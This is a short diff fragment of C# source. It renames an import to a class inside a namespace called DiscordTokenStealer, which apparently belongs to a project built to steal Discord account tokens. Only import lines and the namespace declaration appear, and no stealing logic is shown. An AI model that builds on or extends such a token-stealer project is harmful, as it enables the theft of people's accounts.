@@ -4,7 +4,7 @@ using System.Text;
 using Microsoft.Win32;
 using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
-using static IPInfo.IPInfo;
+using static DiscordTokenStealer.IPInfo;
 
 namespace DiscordTokenStealer
 {
